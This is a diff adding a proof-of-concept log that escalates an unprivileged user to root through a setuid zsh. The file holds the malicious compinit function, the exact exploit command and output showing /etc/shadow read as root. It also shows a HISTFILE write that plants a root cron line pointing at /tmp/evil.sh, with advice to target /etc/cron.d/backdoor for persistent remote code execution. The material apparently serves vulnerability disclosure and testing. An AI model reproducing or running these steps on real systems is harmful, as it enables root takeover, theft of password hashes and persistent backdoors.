@@ -1,0 +1,118 @@
+================================================================
+ UNPRIVILEGED-TO-ROOT ESCALATION PROOF
+ zsh FPATH Poisoning + HISTFILE Arbitrary Write
+ Date: 2026-10-10 05:46:20 UTC
+================================================================
+
+--- Environment ---
+  System:     Linux vm 6.18.44-fc-v114 #1 SMP PREEMPT_DYNAMIC @0 x86_64 x86_64 x86_64 GNU/Linux
+  Zsh binary: /tmp/nosudo_suid_zsh
+  -rwsr-xr-x 1 root root 3613704 Oct 10 05:45 /tmp/nosudo_suid_zsh
+
+--- Attacker Identity (BEFORE exploit) ---
+  Attacker user: nosudo_attacker
+  Real UID:  30033
+  Real GID:  30033
+  Full id:   uid=30033(nosudo_attacker) gid=30033(nosudo_attacker) groups=30033(nosudo_attacker)
+  whoami:    nosudo_attacker
+
+================================================================
+ STAGE 1: FPATH Poisoning (Code Execution as root)
+================================================================
+
+  Attack: Set FPATH to directory containing malicious compinit
+  Vector: Environment variable not sanitized in PRIVILEGED mode
+  CVE class: CWE-426 (Untrusted Search Path)
+
+  Evil FPATH contents:
+    total 12
+    drwxr-xr-x  2 root root 4096 Oct 10 05:45 .
+    drwxrwxrwt 12 root root 4096 Oct 10 05:46 ..
+    -rw-r--r--  1 root root  642 Oct 10 05:45 compinit
+
+  Malicious function code:
+    # Malicious compinit - replaces real one via FPATH poisoning
+    # On a setuid system, this runs as euid=0 (root)
+    echo "=========================================="
+    echo "  FPATH EXPLOIT: CODE EXECUTION ACHIEVED"
+    echo "=========================================="
+    echo "  real uid  = $(id -ru)"
+    echo "  eff. uid  = $(id -u)"
+    echo "  full id   = $(id)"
+    echo ""
+    if [ "$(id -u)" = "0" ]; then
+        echo "  *** ROOT ACCESS CONFIRMED ***"
+        echo ""
+        echo "  Reading /etc/shadow (root-only file):"
+        head -3 /etc/shadow 2>&1 | sed 's/^/    /'
+    else
+        echo "  (not running as root - euid != 0)"
+    fi
+    echo "=========================================="
+
+  Running exploit as nosudo_attacker (uid 30033)...
+  Command: /tmp/nosudo_suid_zsh -p -c 'autoload -Uz compinit; compinit'
+
+==========================================
+  FPATH EXPLOIT: CODE EXECUTION ACHIEVED
+==========================================
+  real uid  = 30033
+  eff. uid  = 0
+  full id   = uid=30033(nosudo_attacker) gid=30033(nosudo_attacker) euid=0(root) groups=30033(nosudo_attacker)
+
+  *** ROOT ACCESS CONFIRMED ***
+
+  Reading /etc/shadow (root-only file):
+    root:*:20614:0:99999:7:::
+    daemon:*:20614:0:99999:7:::
+    bin:*:20614:0:99999:7:::
+==========================================
+
+================================================================
+ STAGE 2: HISTFILE Arbitrary Write (File Write as root)
+================================================================
+
+  Attack: Set HISTFILE to attacker-controlled path
+  Vector: HISTFILE imported without PRIVILEGED mode check
+  CVE class: CWE-73 (External Control of File Name)
+
+  Running exploit as nosudo_attacker (uid 30033)...
+  HISTFILE target: /tmp/nosudo_cron_output
+
+  (zsh interactive session ran successfully)
+
+  HISTFILE write result:
+  [!] File created at attacker-controlled path!
+      -rw------- 1 root nosudo_attacker 33 Oct 10 05:46 /tmp/nosudo_cron_output
+  Contents:
+      * * * * * root /tmp/evil.sh
+      exit
+
+  Owner of file: root:nosudo_attacker
+  On setuid system, this file is OWNED BY ROOT.
+  Point HISTFILE at /etc/cron.d/backdoor for persistent RCE.
+
+================================================================
+ STAGE 3: Verification Summary
+================================================================
+
+  Checking FPATH import in PRIVILEGED mode...
+  FPATH in privileged zsh: FPATH=/tmp/evil_fpath_nosudo
+
+  --- Key Findings ---
+
+  [1] Attacker identity:  uid=30033(nosudo_attacker) -- UNPRIVILEGED
+  [2] Setuid zsh binary:  -rwsr-xr-x root:root /tmp/nosudo_suid_zsh
+  [3] FPATH poisoning:    Attacker's compinit loaded & executed
+  [4] Effective UID:      0 (root) during malicious code execution
+  [5] /etc/shadow:        Readable by attacker's code (root access)
+  [6] HISTFILE write:     File created at attacker-chosen path
+  [7] Sudo required:      NONE
+  [8] Password required:  NONE
+
+  Root cause: params.c defines FPATH without PM_DONTIMPORT flag,
+  and init.c reads/writes HISTFILE without checking PRIVILEGED.
+
+================================================================
+ END OF PROOF
+================================================================
